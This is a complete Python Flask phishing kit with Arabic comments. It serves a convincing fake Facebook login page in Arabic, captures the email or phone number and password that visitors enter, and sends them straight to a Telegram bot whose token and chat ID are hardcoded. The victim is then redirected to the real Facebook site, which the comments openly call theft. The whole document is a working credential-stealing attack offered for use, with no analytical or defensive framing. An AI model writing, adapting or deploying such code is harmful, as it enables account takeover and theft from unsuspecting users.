from flask import Flask, render_template_string, request, redirect
import requests

app = Flask(__name__)

# --- إعدادات التليجرام الجاهزة والجديدة ---
TOKEN = "8599495749:AAFIQkYkNLJV_Xn_ZckTIxFoTp8Fm4ChlG0" # التوكن الجديد الخاص بك
CHAT_ID = "7479786207" # المعرف الخاص بك

# واجهة فيسبوك "خرافية" واحترافية للتمويه (بدون شعارات مريبة)
fb_login_ui = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى فيسبوك</title>
    <style>
        body { background-color: #f0f2f5; font-family: -apple-system, BlinkMacSystemFont, ".SFNSText-Regular", sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .fb-logo { width: 150px; margin-bottom: 20px; }
        .login-box { background-color: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
        .login-text { color: #1c1e21; font-size: 20px; margin-bottom: 25px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 14px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
        .login-btn { width: 100%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; transition: background-color 0.2s; }
        .login-btn:hover { background-color: #166fe5; }
        .forgot-pass { color: #1877f2; font-size: 14px; margin-top: 15px; cursor: pointer; }
        hr { border: 0; border-top: 1px solid #dddfe2; margin: 25px 0; }
        .new-account-btn { padding: 12px 20px; background-color: #42b72a; color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 14px; cursor: pointer; text-decoration: none; display: inline-block; transition: background-color 0.2s; }
        .new-account-btn:hover { background-color: #36a420; }
        .language-list { margin-top: 50px; font-size: 12px; color: #737373; }
        .language-list span { margin: 0 5px; cursor: pointer; }
    </style>
</head>
<body>
    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" class="fb-logo">
    <div class="login-box">
        <p class="login-text">تسجيل الدخول للمشاركة</p>
        <form action="/send_login" method="POST">
            <input type="text" name="mail_or_phone" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" name="password" placeholder="كلمة السر" required>
            <button type="submit" class="login-btn">تسجيل الدخول</button>
        </form>
        <p class="forgot-pass">هل نسيت كلمة السر؟</p>
        <hr>
        <a href="https://www.facebook.com/r.php" class="new-account-btn">إنشاء حساب جديد</a>
    </div>
    <div class="language-list">
        <span>العربية</span> | <span>Français (France)</span> | <span>English (US)</span> | <span>Español</span> | <span style="font-weight:bold;">+</span>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(fb_login_ui)

@app.route('/send_login', methods=['POST'])
def send_login():
    user_detail = request.form.get('mail_or_phone')
    password_detail = request.form.get('password')
    
    # رسالة التبليغ الجديدة والجاهزة
    tg_msg = f"🔥 صيد جديد يا فارس! 🔥\\n\\n👤 الحساب: {user_detail}\\n🔑 المودباس: {password_detail}"
    
    # إرسال البيانات فوراً لبوت التليجرام
    try:
        tg_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={tg_msg}"
        requests.get(tg_url)
    except:
        pass
        
    # توجيه الضحية لصفحة فيسبوك الحقيقية بعد السرقة
    return redirect("https://www.facebook.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
